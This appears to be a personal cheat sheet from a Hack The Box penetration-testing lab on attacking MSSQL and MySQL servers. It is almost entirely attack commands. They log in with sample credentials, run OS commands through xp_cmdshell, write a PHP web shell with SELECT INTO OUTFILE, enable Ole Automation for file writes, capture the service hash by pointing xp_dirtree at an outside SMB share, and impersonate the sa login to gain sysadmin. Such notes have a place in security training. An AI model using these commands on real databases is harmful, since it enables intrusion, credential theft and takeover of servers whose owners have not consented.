#### connect to sql with sqlcmd (windows)
```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```
#### connect to sql with sqlcmd (Linux)
```shell-session
Tachipy@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

#### mssqlclient.py


```shell-session
Tachipy@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 
```

#### SConnecting to the SQL Server using windows auth

```shell-session
Tachipy@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

##### Execute CMD in MSSQL
##### XP_CMDSHELL

  XP_CMDSHELL

```cmd-session
1> xp_cmdshell 'whoami'
2> GO
```
#### MySQL - Write Local File

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
##### MySQL - Secure File Privileges

  MySQL - Secure File Privileges

```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

##### MSSQL - Enable Ole Automation Procedures

  MSSQL - Enable Ole Automation Procedures

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

## Capture MSSQL Service Hash


```cmd-session
EXEC master..xp_dirtree '\\10.10.110.17\share\'
```
```mssql
EXEC master..xp_subdirs '\\10.10.15.229\share\'
```
#### Identify Users that We Can Impersonate

  Identify Users that We Can Impersonate

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
```

#### Impersonating the SA User

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```